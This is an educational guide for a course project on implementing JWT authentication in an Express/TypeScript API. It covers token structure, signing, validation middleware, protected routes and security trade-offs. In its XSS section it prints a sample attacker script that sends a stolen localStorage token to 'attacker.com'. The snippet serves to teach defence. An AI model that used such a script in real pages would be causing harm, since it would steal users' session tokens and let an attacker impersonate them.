# JWT Implementation Guide for TCSS-460-auth-squared

A comprehensive educational guide to understanding and implementing JWT (JSON Web Tokens) authentication for senior CS students.

> **💡 Related Code**: See implementations in [`/src/core/middleware/jwt.ts`](https://github.com/cfb3/TCSS-460-auth-squared/blob/main/src/core/middleware/jwt.ts), [`/src/controllers/authController.ts`](https://github.com/cfb3/TCSS-460-auth-squared/blob/main/src/controllers/authController.ts), and [`/src/core/utilities/tokenUtils.ts`](https://github.com/cfb3/TCSS-460-auth-squared/blob/main/src/core/utilities/tokenUtils.ts)

## Quick Navigation
- 🔐 **Login Endpoint**: `POST /auth/login` - Authenticate and receive JWT token
- 📝 **Register Endpoint**: `POST /auth/register` - Create account and receive JWT token
- 🛡️ **Protected Routes**: `/auth/user/*` - Routes requiring JWT authentication
- 🔧 **JWT Middleware**: [`jwt.ts`](https://github.com/cfb3/TCSS-460-auth-squared/blob/main/src/core/middleware/jwt.ts) - Token validation logic
- 🎫 **Token Utils**: [`tokenUtils.ts`](https://github.com/cfb3/TCSS-460-auth-squared/blob/main/src/core/utilities/tokenUtils.ts) - Token generation utilities
- 📚 **API Docs**: [Swagger UI](http://localhost:8000/api-docs) - Interactive API testing
- 🔒 **Security**: [Web Security Guide](./web-security-guide.md#authentication-vs-authorization) - Security best practices

## Table of Contents

- [Introduction to JWT](#introduction-to-jwt)
- [JWT Structure Explained](#jwt-structure-explained)
- [How TCSS-460-auth-squared Uses JWT](#how-tcss-460-auth-squared-uses-jwt)
- [Token Generation (Login Flow)](#token-generation-login-flow)
- [Token Validation Middleware](#token-validation-middleware)
- [Token Claims and Payload Structure](#token-claims-and-payload-structure)
- [Protected Routes Implementation](#protected-routes-implementation)
- [Security Considerations](#security-considerations)
- [Best Practices](#best-practices)
- [Common Mistakes and How to Avoid Them](#common-mistakes-and-how-to-avoid-them)
- [Hands-On Exercises](#hands-on-exercises)

---

## Introduction to JWT

### What is JWT?

**JWT (JSON Web Token)** is an open industry standard (RFC 7519) for representing claims securely between two parties. Think of it as a **digital passport** that proves your identity without needing to check with the issuing authority every time.

🎯 **Learning Objective**: Understand why JWTs are different from traditional session-based authentication.

### The Real-World Analogy

Imagine you're at an amusement park:

**Traditional Sessions (Without JWT)**:
- You buy a ticket at the entrance (login)
- Every time you want to ride an attraction, you go back to the entrance to verify your ticket (database lookup)
- This creates long lines and is inefficient

**JWT Authentication**:
- You buy a ticket at the entrance (login) and receive a special **wristband with a tamper-proof seal** (JWT)
- The wristband has your name, access level, and expiration date encoded on it
- Each attraction just checks your wristband (verify signature) without calling back to the entrance
- Much faster and scales better with thousands of visitors

### Why Use JWT?

**✅ Advantages**:
1. **Stateless** - Server doesn't need to store session data (no database lookups)
2. **Scalable** - Works perfectly with microservices and distributed systems
3. **Self-contained** - All user information is in the token itself
4. **Cross-domain** - Can be used across different domains (mobile apps, SPAs)
5. **Standard** - RFC 7519 means wide support across languages and frameworks

**⚠️ Considerations**:
1. **Cannot be revoked** - Valid until expiration (unless you implement a token blacklist)
2. **Size** - Larger than simple session IDs (typically 200-500 bytes)
3. **Secret management** - The secret key must be kept secure
4. **Not encrypted** - Data is encoded (base64), not encrypted - don't store sensitive data

---

## JWT Structure Explained

A JWT consists of three parts separated by dots (`.`):

```
HEADER.PAYLOAD.SIGNATURE
```

### Real JWT Example from TCSS-460-auth-squared

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTIzLCJlbWFpbCI6InVzZXJAZXhhbXBsZS5jb20iLCJyb2xlIjoxLCJpYXQiOjE3MDk1NTcyMDAsImV4cCI6MTcxMDc2NjgwMH0.abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGH
```

Let's break down each part:

### Part 1: Header (Algorithm and Token Type)

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

- **`alg`**: Signing algorithm - HMAC SHA-256 in our case
- **`typ`**: Token type - Always "JWT"

This header is **Base64URL-encoded** to create the first part of the token.

🎯 **Learning Objective**: The header tells the verifier how to validate the signature.

### Part 2: Payload (Claims - The User Data)

```json
{
  "id": 123,
  "email": "user@example.com",
  "role": 1,
  "iat": 1709557200,
  "exp": 1710766800
}
```

**Standard Claims** (defined by RFC 7519):
- **`iat`** (issued at) - Unix timestamp when token was created
- **`exp`** (expiration) - Unix timestamp when token expires

**Custom Claims** (specific to TCSS-460-auth-squared):
- **`id`** - Account ID from the database
- **`email`** - User's email address
- **`role`** - User's role (1=User, 2=Moderator, 3=Admin, 4=SuperAdmin, 5=Owner)

This payload is also **Base64URL-encoded** to create the second part of the token.

🎯 **Learning Objective**: The payload contains all the information needed to identify the user without a database lookup.

### Part 3: Signature (Cryptographic Verification)

The signature ensures the token hasn't been tampered with. It's created using:

```javascript
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  JWT_SECRET
)
```

**How it works**:
1. Take the encoded header and payload
2. Combine them with a dot (`.`)
3. Sign this string using HMAC-SHA256 with your **secret key**
4. The result is the signature

**Important**: Only someone with the secret key can create a valid signature. This prevents tampering.

🎯 **Learning Objective**: The signature is what makes JWTs secure. Without the secret key, attackers cannot create valid tokens.

### Decoding vs Verifying

**Decoding** (anyone can do this):
```bash
# Using jwt.io or any base64 decoder
echo "eyJpZCI6MTIzLCJlbWFpbCI6InVzZXJAZXhhbXBsZS5jb20iLCJyb2xlIjoxfQ" | base64 -d
# Result: {"id":123,"email":"user@example.com","role":1}
```

**Verifying** (requires the secret key):
```typescript
// Only the server with JWT_SECRET can verify the signature
jwt.verify(token, process.env.JWT_SECRET);
```

⚠️ **Security Note**: Never put sensitive data (passwords, credit cards, SSNs) in JWT payload - it's not encrypted!

---

## How TCSS-460-auth-squared Uses JWT

### Authentication Architecture

```
┌─────────────────────────────────────────────────────────────┐
│ 1. USER REGISTRATION/LOGIN                                  │
│    POST /auth/register or POST /auth/login                  │
│    - User submits credentials (email, password)             │
│    - Server validates credentials                           │
│    - Server generates JWT with 14-day expiration            │
│    - JWT returned to client in response                     │
└─────────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────────┐
│ 2. CLIENT STORES TOKEN                                      │
│    - Browser stores JWT (localStorage or memory)            │
│    - Mobile app stores JWT (secure storage)                 │
└─────────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────────┐
│ 3. SUBSEQUENT REQUESTS                                      │
│    Client includes JWT in Authorization header:             │
│    Authorization: Bearer <token>                            │
└─────────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────────┐
│ 4. SERVER VALIDATES TOKEN                                   │
│    - Middleware extracts token from header                  │
│    - Verifies signature using JWT_SECRET                    │
│    - Checks expiration (automatic with jwt.verify)          │
│    - Extracts claims and attaches to request object         │
│    - Continues to route handler                             │
└─────────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────────┐
│ 5. PROTECTED ROUTE EXECUTES                                 │
│    - Route handler has access to user info via request      │
│    - Performs business logic with authenticated user        │
│    - Returns response                                       │
└─────────────────────────────────────────────────────────────┘
```

### Token Lifecycle in TCSS-460-auth-squared

**Generation**: 14-day expiration for access tokens
- Login: `POST /auth/login`
- Registration: `POST /auth/register`

**Validation**: Every protected route
- Middleware: `checkToken()` in `/src/core/middleware/jwt.ts`
- Applied to: All routes under `/auth/user/*`

**Claims Structure**:
```typescript
{
  id: number;        // Account_ID from database
  email: string;     // User's email
  role: number;      // Account_Role (1-5)
  iat: number;       // Issued at timestamp
  exp: number;       // Expiration timestamp
}
```

---

## Token Generation (Login Flow)

Let's examine how TCSS-460-auth-squared generates JWT tokens during the login process.

### Step-by-Step: Login Controller

**File**: `/src/controllers/authController.ts` (Lines 91-166)

```typescript
static async login(request: IJwtRequest, response: Response): Promise<void> {
    const { email, password } = request.body;

    try {
        // STEP 1: Find account in database
        const accountResult = await pool.query(
            `SELECT
                a.Account_ID, a.FirstName, a.LastName, a.Username,
                a.Email, a.Account_Role, a.Email_Verified,
                a.Phone_Verified, a.Account_Status,
                ac.Salted_Hash, ac.Salt
            FROM Account a
            LEFT JOIN Account_Credential ac ON a.Account_ID = ac.Account_ID
            WHERE a.Email = $1`,
            [email]
        );

        if (accountResult.rowCount === 0) {
            sendError(response, 401, 'Invalid credentials',
                     ErrorCodes.AUTH_INVALID_CREDENTIALS);
            return;
        }

        const account = accountResult.rows[0];

        // STEP 2: Check account status
        if (account.account_status === 'suspended') {
            sendError(response, 403, 'Account is suspended. Please contact support.',
                     ErrorCodes.AUTH_ACCOUNT_SUSPENDED);
            return;
        }
        if (account.account_status === 'locked') {
            sendError(response, 403, 'Account is locked. Please contact support.',
                     ErrorCodes.AUTH_ACCOUNT_LOCKED);
            return;
        }

        // STEP 3: Verify password using cryptographic hash comparison
        if (!account.salted_hash ||
            !verifyPassword(password, account.salt, account.salted_hash)) {
            sendError(response, 401, 'Invalid credentials',
                     ErrorCodes.AUTH_INVALID_CREDENTIALS);
            return;
        }

        // STEP 4: Generate JWT token (THE KEY PART!)
        const jwtSecret = getEnvVar('JWT_SECRET');
        const token = jwt.sign(
            {
                id: account.account_id,
                email: account.email,
                role: account.account_role
            },
            jwtSecret,
            { expiresIn: '14d' }  // Token expires in 14 days
        );

        // STEP 5: Return token and user info
        const roleNames = ['', 'User', 'Moderator', 'Admin', 'SuperAdmin', 'Owner'];
        const roleName = roleNames[account.account_role] || 'User';

        sendSuccess(response, {
            accessToken: token,  // This is the JWT!
            user: {
                id: account.account_id,
                email: account.email,
                name: account.firstname,
                lastname: account.lastname,
                username: account.username,
                role: roleName,
                emailVerified: account.email_verified,
                phoneVerified: account.phone_verified,
                accountStatus: account.account_status,
            },
        }, 'Login successful');

    } catch (error) {
        console.error('Login error:', error);
        sendError(response, 500, 'Server error - contact support',
                 ErrorCodes.SRVR_DATABASE_ERROR);
    }
}
```

### Breaking Down JWT Generation

The critical lines (133-141) use the `jsonwebtoken` library:

```typescript
const token = jwt.sign(
    {
        id: account.account_id,      // Payload: User ID
        email: account.email,         // Payload: Email
        role: account.account_role    // Payload: Role
    },
    jwtSecret,                        // Secret key from environment
    { expiresIn: '14d' }             // Options: 14-day expiration
);
```

**What `jwt.sign()` does**:
1. Creates the header: `{ "alg": "HS256", "typ": "JWT" }`
2. Creates the payload with your data + `iat` (issued at) and `exp` (expiration)
3. Encodes header and payload as base64
4. Signs the combined string with HMAC-SHA256 using JWT_SECRET
5. Returns the complete token: `header.payload.signature`

🎯 **Learning Objective**: Token generation is just three parameters: payload (user data), secret (signing key), and options (expiration).

### Token Generation Utility

For cleaner code, TCSS-460-auth-squared also provides a utility function:

**File**: `/src/core/utilities/tokenUtils.ts` (Lines 20-32)

```typescript
export interface AccessTokenPayload {
    id: number;
    email: string;
    role: number;
}

/**
 * Generate access token for authenticated user sessions
 */
export const generateAccessToken = (payload: AccessTokenPayload): string => {
    const jwtSecret = getEnvVar('JWT_SECRET');

    return jwt.sign(
        {
            id: payload.id,
            email: payload.email,
            role: payload.role
        },
        jwtSecret,
        { expiresIn: '14d' }
    );
};
```

**Usage in registration** (Line 61 in authController.ts):
```typescript
const token = generateAccessToken({
    id: accountId,
    email,
    role: 1
});
```

### Example: Login Request/Response

**Request**:
```bash
curl -X POST http://localhost:8000/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "student@uw.edu",
    "password": "securePassword123"
  }'
```

**Response**:
```json
{
  "success": true,
  "message": "Login successful",
  "data": {
    "accessToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTIsImVtYWlsIjoic3R1ZGVudEB1dy5lZHUiLCJyb2xlIjoxLCJpYXQiOjE3MDk1NTcyMDAsImV4cCI6MTcxMDc2NjgwMH0.1234567890abcdefghijklmnopqrstuvwxyz",
    "user": {
      "id": 12,
      "email": "student@uw.edu",
      "name": "John",
      "lastname": "Doe",
      "username": "johndoe",
      "role": "User",
      "emailVerified": true,
      "phoneVerified": false,
      "accountStatus": "active"
    }
  },
  "timestamp": "2024-03-04T10:30:00.000Z"
}
```

🎯 **Learning Objective**: The client receives the JWT in the response and must store it for future requests.

---

## Token Validation Middleware

Now that we understand how tokens are generated, let's see how they're validated on protected routes.

### Step-by-Step: JWT Middleware

**File**: `/src/core/middleware/jwt.ts` (Lines 5-37)

```typescript
import jwt, { JwtPayload } from 'jsonwebtoken';
import { Response, NextFunction } from 'express';
import { IJwtClaims, IJwtRequest } from '@models';

export const checkToken = (
    request: IJwtRequest,
    response: Response,
    next: NextFunction
) => {
    // STEP 1: Extract token from headers
    // Supports both 'x-access-token' and 'authorization' headers
    let token: string =
        (request.headers['x-access-token'] as string) ||
        (request.headers['authorization'] as string);

    if (token != undefined) {
        // STEP 2: Remove "Bearer " prefix if present
        if (token.startsWith('Bearer ')) {
            // Remove Bearer from string
            token = token.slice(7, token.length);
        }

        // STEP 3: Verify signature and decode payload
        jwt.verify(token, process.env.JWT_SECRET, (error, decoded: JwtPayload) => {
            if (error) {
                // Signature invalid or token expired
                response.status(403).json({
                    success: false,
                    message: 'Token is not valid',
                });
            } else {
                // Token is valid - attach claims to request
                request.claims = decoded as IJwtClaims;
                next();  // Continue to route handler
            }
        });
    } else {
        // No token provided
        response.status(401).json({
            success: false,
            message: 'Auth token is not supplied',
        });
    }
};
```

### Breaking Down Token Validation

**Step 1: Extract Token from Headers**

The middleware checks two possible headers:
- `x-access-token`: Custom header (legacy support)
- `authorization`: Standard HTTP header (preferred)

```typescript
let token: string =
    (request.headers['x-access-token'] as string) ||
    (request.headers['authorization'] as string);
```

**Step 2: Remove Bearer Prefix**

Standard JWT format uses "Bearer" prefix:
```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

The middleware strips this prefix:
```typescript
if (token.startsWith('Bearer ')) {
    token = token.slice(7, token.length);
}
```

**Step 3: Verify and Decode**

The magic happens with `jwt.verify()`:
```typescript
jwt.verify(token, process.env.JWT_SECRET, (error, decoded: JwtPayload) => {
    if (error) {
        // Invalid signature or expired token
        response.status(403).json({
            success: false,
            message: 'Token is not valid',
        });
    } else {
        // Valid token - attach user info to request
        request.claims = decoded as IJwtClaims;
        next();
    }
});
```

**What `jwt.verify()` does**:
1. Decodes the header and payload
2. Recreates the signature using JWT_SECRET
3. Compares signatures (constant-time comparison to prevent timing attacks)
4. Checks expiration (`exp` claim)
5. Returns decoded payload if valid, or throws error

🎯 **Learning Objective**: Verification is automatic - you just need to call `jwt.verify()` with the secret.

### Error Handling

The middleware returns different status codes:

- **401 Unauthorized**: Token not provided
  ```json
  {
    "success": false,
    "message": "Auth token is not supplied"
  }
  ```

- **403 Forbidden**: Token invalid or expired
  ```json
  {
    "success": false,
    "message": "Token is not valid"
  }
  ```

**Why different codes?**
- **401**: "You need to authenticate" (no token)
- **403**: "Your authentication is invalid" (bad token)

### Claims Structure

After successful verification, the decoded payload is available as `request.claims`:

**Type Definitions** (from `/src/core/models/index.ts`):

```typescript
// JWT claims structure - what's stored inside the token
export interface IJwtClaims {
    id: number;
    email: string;
    role: UserRole;
    iat?: number;  // Issued at (optional, added automatically by jwt.sign())
    exp?: number;  // Expiration (optional, added automatically by jwt.sign())
}

// Extended Request type for TypeScript - adds claims property
export interface IJwtRequest extends Request {
    claims?: IJwtClaims;  // Populated by checkToken middleware
}
```

**Why IJwtRequest?** When using TypeScript, the standard Express `Request` type doesn't know about the `claims` property we add in our middleware. The `IJwtRequest` interface extends `Request` to tell TypeScript that `request.claims` exists and is type-safe.

**Usage in Route Handlers**:
```typescript
// Note: Using IJwtRequest instead of Request for TypeScript type safety
static async changePassword(request: IJwtRequest, response: Response) {
    // TypeScript now knows request.claims exists!
    const userId = request.claims.id;  // Access user ID from token
    const userEmail = request.claims.email;
    const userRole = request.claims.role;
    // ... rest of logic
}
```

🎯 **Learning Objective**: Once the token is verified, you have access to all user information without a database query. TypeScript's `IJwtRequest` type ensures compile-time safety when accessing claims.

---

## Token Claims and Payload Structure

Understanding what data goes into JWT tokens is crucial for building secure authentication systems.

### TCSS-460-auth-squared Token Payload

**Complete Structure**:
```typescript
{
  // Custom Claims (application-specific)
  id: number;           // Account_ID from database
  email: string;        // User's email address
  role: number;         // User's role (1-5)

  // Standard JWT Claims (added automatically)
  iat: number;          // Issued At - Unix timestamp when token was created
  exp: number;          // Expiration - Unix timestamp when token expires
}
```

### Standard JWT Claims (RFC 7519)

While TCSS-460-auth-squared only uses `iat` and `exp`, here are other standard claims:

| Claim | Name | Description | Example |
|-------|------|-------------|---------|
| `iss` | Issuer | Who created the token | `"auth.tcss460.com"` |
| `sub` | Subject | Subject identifier (often user ID) | `"123"` |
| `aud` | Audience | Who the token is intended for | `"api.tcss460.com"` |
| `exp` | Expiration | When the token expires | `1710766800` |
| `nbf` | Not Before | Token not valid before this time | `1709557200` |
| `iat` | Issued At | When the token was created | `1709557200` |
| `jti` | JWT ID | Unique identifier for the token | `"abc123"` |

### Custom Claims in TCSS-460-auth-squared

**1. User ID (`id`)**
```typescript
id: account.account_id  // e.g., 123
```
- Primary key from `Account` table
- Used to identify the user without database lookups
- Essential for authorization checks

**2. Email (`email`)**
```typescript
email: account.email  // e.g., "student@uw.edu"
```
- User's email address
- Useful for audit logging
- Can be displayed in UI without additional queries

**3. Role (`role`)**
```typescript
role: account.account_role  // e.g., 1, 2, 3, 4, or 5
```
- Determines user permissions
- Maps to role hierarchy:
  - `1` = User (default)
  - `2` = Moderator
  - `3` = Admin
  - `4` = SuperAdmin
  - `5` = Owner

### Token Types in TCSS-460-auth-squared

**Why Multiple Token Types?** Different operations have different security requirements. A token for staying logged in should last days, but a token for resetting your password should expire quickly. Using different token types allows us to balance security with user experience.

The system uses multiple token types for different purposes:

**1. Access Tokens** (14-day expiration)
```typescript
// File: /src/core/utilities/tokenUtils.ts (lines 20-32)
export const generateAccessToken = (payload: AccessTokenPayload): string => {
    const jwtSecret = getEnvVar('JWT_SECRET');

    return jwt.sign(
        {
            id: payload.id,
            email: payload.email,
            role: payload.role
        },
        jwtSecret,
        { expiresIn: '14d' }  // Long-lived for user sessions
    );
};
```

**When used:** After successful login or registration. Returned to the client and included in the `Authorization` header for all subsequent requests to protected endpoints.

**Purpose:** Allows users to stay logged in for 14 days without re-authenticating. Contains full user identity (id, email, role) for authorization decisions.

**2. Password Reset Tokens** (15-minute expiration)
```typescript
// File: /src/core/utilities/tokenUtils.ts (lines 37-50)
export const generatePasswordResetToken = (userId: number, email: string): string => {
    const jwtSecret = getEnvVar('JWT_SECRET');

    return jwt.sign(
        {
            id: userId,
            email,
            type: 'password_reset',  // Identifies token type
            timestamp: Date.now()
        },
        jwtSecret,
        { expiresIn: '15m' }  // Short-lived for security
    );
};
```

**When used:** When a user requests a password reset via `POST /auth/password/reset-request`. The token is sent via email link.

**Purpose:** Provides time-limited authorization to reset a password. Short expiration (15 minutes) limits the window of vulnerability if the email is compromised. The `type` field prevents reusing this token as an access token.

**3. Verification Tokens** (24-hour expiration)
```typescript
// File: /src/core/utilities/tokenUtils.ts (lines 55-67)
export const generateVerificationToken = (userId: number, type: 'email' | 'phone'): string => {
    const jwtSecret = getEnvVar('JWT_SECRET');

    return jwt.sign(
        {
            id: userId,
            type: `${type}_verification`,
            timestamp: Date.now()
        },
        jwtSecret,
        { expiresIn: '24h' }
    );
};
```

**When used:** For email verification links sent after registration or when requesting email re-verification.

**Purpose:** Provides a reasonable window (24 hours) for users to check their email and verify their account. Longer than password reset because email verification is less security-critical than password changes.

🎯 **Learning Objective**: Different token types have different expirations based on security requirements. Sensitive operations (password reset) use short expiration, while user convenience features (access tokens, verification) can be longer-lived.

### What NOT to Put in JWT Payload

❌ **Never include**:
- Passwords (even hashed)
- Credit card numbers
- Social Security Numbers
- API keys or secrets
- Personally Identifiable Information (PII) beyond what's necessary

✅ **Safe to include**:
- User ID
- Email (if not considered sensitive)
- Role/permissions
- Non-sensitive preferences
- Expiration information

**Why?** JWT payloads are **encoded, not encrypted**. Anyone can decode them:
```bash
# Decode JWT payload (no secret needed)
echo "eyJpZCI6MTIzLCJlbWFpbCI6InVzZXJAZXhhbXBsZS5jb20ifQ" | base64 -d
# Result: {"id":123,"email":"user@example.com"}
```

---

## Protected Routes Implementation

Let's see how TCSS-460-auth-squared applies JWT authentication to protected routes.

### Applying Middleware to Routes

**File**: `/src/routes/closed/index.ts`

```typescript
import express, { Router } from 'express';
import { AuthController, VerificationController } from '@controllers';
import { checkToken, validatePasswordChange, validatePhoneSend, validatePhoneVerify } from '@middleware';

const closedRoutes: Router = express.Router();

// STEP 1: Apply JWT middleware to ALL routes in this router
closedRoutes.use(checkToken);

// STEP 2: Define protected routes
// All routes below automatically require valid JWT

/**
 * Change password (requires authentication and old password)
 * POST /auth/user/password/change
 */
closedRoutes.post('/auth/user/password/change',
                  validatePasswordChange,
                  AuthController.changePassword);

/**
 * Send SMS verification code
 * POST /auth/verify/phone/send
 */
closedRoutes.post('/auth/verify/phone/send',
                  validatePhoneSend,
                  VerificationController.sendSMSVerification);

/**
 * Verify SMS code
 * POST /auth/verify/phone/verify
 */
closedRoutes.post('/auth/verify/phone/verify',
                  validatePhoneVerify,
                  VerificationController.verifySMSCode);

/**
 * Send email verification
 * POST /auth/verify/email/send
 */
closedRoutes.post('/auth/verify/email/send',
                  VerificationController.sendEmailVerification);

export { closedRoutes };
```

### Key Concept: Middleware Chain

The middleware chain executes in order:

```
Request
   ↓
checkToken (JWT validation)
   ↓
validatePasswordChange (input validation)
   ↓
AuthController.changePassword (business logic)
   ↓
Response
```

**Line 8 is critical**:
```typescript
closedRoutes.use(checkToken);
```

This applies `checkToken` middleware to **every route** defined after this line.

### Public vs Protected Routes

**Public Routes** (no JWT required):
**File**: `/src/routes/open/index.ts`

```typescript
const openRoutes: Router = express.Router();

// NO checkToken middleware!

/**
 * Authenticate user and return JWT token
 * POST /auth/login
 */
openRoutes.post('/auth/login', validateLogin, AuthController.login);

/**
 * Register a new user
 * POST /auth/register
 */
openRoutes.post('/auth/register', validateRegister, AuthController.register);

/**
 * Request password reset
 * POST /auth/password/reset-request
 */
openRoutes.post('/auth/password/reset-request',
                validatePasswordResetRequest,
                AuthController.requestPasswordReset);
```

🎯 **Learning Objective**: Public routes (login, register) don't require JWT because users don't have tokens yet.

### Using Claims in Route Handlers

Once `checkToken` middleware succeeds, `request.claims` contains user information:

```typescript
// IMPORTANT: Use IJwtRequest type instead of Request
// This tells TypeScript that request.claims exists and what type it is
static async changePassword(request: IJwtRequest, response: Response): Promise<void> {
    const { oldPassword, newPassword } = request.body;

    // Access user ID from JWT claims (no database lookup needed!)
    // TypeScript knows request.claims exists because we typed request as IJwtRequest
    const userId = request.claims.id;
    const userEmail = request.claims.email;

    try {
        // Get current credentials using user ID from token
        const credentialsResult = await pool.query(
            'SELECT Salted_Hash, Salt FROM Account_Credential WHERE Account_ID = $1',
            [userId]
        );

        // ... rest of password change logic
    } catch (error) {
        console.error('Password change error:', error);
        sendError(response, 500, 'Failed to change password',
                 ErrorCodes.SRVR_DATABASE_ERROR);
    }
}
```

**TypeScript Note**: The `IJwtRequest` type is required when using TypeScript to access `request.claims`. The standard Express `Request` type doesn't include a `claims` property, so TypeScript would give you a compile error without `IJwtRequest`. This is why you'll see `request: IJwtRequest` instead of `request: Request` in all protected route handlers.

**Security benefit**: The user ID comes from the **verified JWT**, not from request body or URL parameters. This prevents users from changing other users' passwords.

### Request Example: Protected Route

**Without JWT (fails)**:
```bash
curl -X POST http://localhost:8000/auth/user/password/change \
  -H "Content-Type: application/json" \
  -d '{
    "oldPassword": "currentPass123",
    "newPassword": "newSecurePass456"
  }'
```

**Response**:
```json
{
  "success": false,
  "message": "Auth token is not supplied"
}
```

**With JWT (succeeds)**:
```bash
curl -X POST http://localhost:8000/auth/user/password/change \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." \
  -d '{
    "oldPassword": "currentPass123",
    "newPassword": "newSecurePass456"
  }'
```

**Response**:
```json
{
  "success": true,
  "message": "Password changed successfully",
  "timestamp": "2024-03-04T10:30:00.000Z"
}
```

---

## Security Considerations

JWT authentication is secure when implemented correctly, but there are important considerations.

### 1. Secret Key Management

**Critical**: Your `JWT_SECRET` must be kept secure and never exposed.

**Best Practices**:

✅ **DO**:
- Store in environment variables (`.env` file)
- Use long, random, cryptographically secure secrets (minimum 256 bits)
- Different secrets for development, staging, and production
- Rotate secrets periodically
- Use secret management systems in production (AWS Secrets Manager, Azure Key Vault)

**In TCSS-460-auth-squared**, the secret is stored in `.env` and loaded via `src/core/utilities/envConfig.ts`:

**`.env` file** (never committed to git):
```bash
JWT_SECRET=your_super_secret_jwt_key_change_this_in_production
```

**How it's loaded** (`src/core/utilities/envConfig.ts`):
```typescript
export const getEnvVar = (key: string, defaultValue?: string): string => {
    const value = process.env[key];
    if (!value && !defaultValue) {
        throw new Error(`Environment variable ${key} is required but not set`);
    }
    return value || defaultValue!;
};

// Usage in tokenUtils.ts
const jwtSecret = getEnvVar('JWT_SECRET');  // Throws error if not set
```

**Security**: The `.env` file is listed in `.gitignore` to prevent committing secrets to version control. See [Environment Configuration Guide](./environment-configuration.md) for more details on managing environment variables.

❌ **DON'T**:
- Hardcode secrets in source code
- Commit secrets to version control (`.env` should be in `.gitignore`)
- Share secrets in Slack, email, or documentation
- Use simple secrets like "secret", "password", "123456"

**Generating Secure Secrets**:
```bash
# Generate 256-bit (32-byte) random secret
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
# Output: 8f7a9b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8
```

🎯 **Learning Objective**: If an attacker gets your JWT_SECRET, they can create valid tokens for any user. Environment variables keep secrets out of source code.

### 2. Token Expiration

**TCSS-460-auth-squared uses 14-day expiration** for access tokens:

```typescript
jwt.sign(payload, jwtSecret, { expiresIn: '14d' })
```

**Trade-offs**:

**Short Expiration (1-24 hours)**:
- ✅ More secure (limited window if token is stolen)
- ❌ Users must re-authenticate frequently
- ✅ Typically used with refresh tokens

**Long Expiration (7-30 days)**:
- ✅ Better user experience (stay logged in)
- ❌ Longer risk window if token is stolen
- ⚠️ Cannot revoke without additional infrastructure

**Different Token Types, Different Expirations**:
```typescript
// Access tokens - long-lived for convenience
{ expiresIn: '14d' }

// Password reset - short-lived for security
{ expiresIn: '15m' }

// Email verification - moderate expiration
{ expiresIn: '24h' }
```

🎯 **Learning Objective**: Choose expiration based on token sensitivity and user experience requirements.

### 3. HTTPS Only

**Critical**: JWTs must ONLY be transmitted over HTTPS in production.

**Why?**
- HTTP is unencrypted - anyone on the network can intercept tokens
- HTTPS encrypts the entire connection
- If JWT is stolen via HTTP, attacker can impersonate the user

**In Production**:
```typescript
// Force HTTPS in production
if (process.env.NODE_ENV === 'production') {
    app.use((req, res, next) => {
        if (req.header('x-forwarded-proto') !== 'https') {
            res.redirect(`https://${req.header('host')}${req.url}`);
        } else {
            next();
        }
    });
}
```

### 4. Token Storage (Client-Side)

**Options for storing JWT on the client**:

**1. localStorage** (common but has risks):
```javascript
// Store token
localStorage.setItem('jwt', token);

// Retrieve token
const token = localStorage.getItem('jwt');

// Use in requests
fetch('/api/protected', {
    headers: {
        'Authorization': `Bearer ${token}`
    }
});
```

**Pros**: Persists across browser sessions
**Cons**: Vulnerable to XSS attacks (JavaScript can access it)

**2. sessionStorage** (slightly more secure):
```javascript
sessionStorage.setItem('jwt', token);
```

**Pros**: Cleared when browser tab closes
**Cons**: Still vulnerable to XSS

**3. httpOnly Cookies** (most secure for web):
```typescript
// Server sets cookie
res.cookie('jwt', token, {
    httpOnly: true,    // JavaScript cannot access
    secure: true,      // HTTPS only
    sameSite: 'strict' // CSRF protection
});
```

**Pros**: Not accessible to JavaScript (XSS protection)
**Cons**: Requires CSRF protection, more complex setup

**4. Memory Only** (most secure but least convenient):
```javascript
// Store in React state or similar
const [token, setToken] = useState(null);
```

**Pros**: Lost on page refresh (very secure)
**Cons**: User must log in every page refresh

🎯 **Learning Objective**: There's no perfect solution - choose based on your security requirements and user experience needs.

### 5. Token Revocation Challenge

**Problem**: Once issued, a JWT is valid until expiration. You cannot "revoke" it.

**Scenario**:
```
1. User logs in → receives JWT (expires in 14 days)
2. User's account is compromised
3. Admin wants to revoke all tokens for this user
4. Problem: JWT is still valid for 14 days!
```

**Solutions**:

**A. Short Expiration + Refresh Tokens**:
```typescript
// Short-lived access token (15 minutes)
const accessToken = jwt.sign(payload, secret, { expiresIn: '15m' });

// Long-lived refresh token (14 days, stored in database)
const refreshToken = generateRefreshToken(userId);

// Client refreshes access token when it expires
// If user is compromised, revoke refresh token in database
```

**B. Token Blacklist** (defeats stateless advantage):
```typescript
// Store revoked tokens in database/Redis
const revokedTokens = new Set();

// Check on each request
if (revokedTokens.has(token)) {
    return res.status(401).json({ message: 'Token revoked' });
}
```

**C. Short Expiration Only** (TCSS-460-auth-squared approach):
- Keep expiration reasonable (14 days)
- Accept that compromised tokens are valid until expiration
- Focus on prevention (HTTPS, secure storage, XSS protection)

### 6. XSS (Cross-Site Scripting) Protection

**XSS is a client-side vulnerability** where an attacker injects malicious JavaScript into your web application. If successful, the attacker's script runs in the user's browser and can steal JWTs stored in localStorage:

```javascript
// Attacker's malicious script running in victim's browser
const token = localStorage.getItem('jwt');
fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token })
});
```

**Who needs XSS protection?** The **frontend/client application** that stores and uses the JWT. While the backend (TCSS-460-auth-squared) validates inputs to prevent XSS payloads from being stored in the database, the primary XSS defense must be in the client-side code.

**Protection Strategies (Client-Side)**:
1. **Input Validation** - Sanitize all user input before displaying
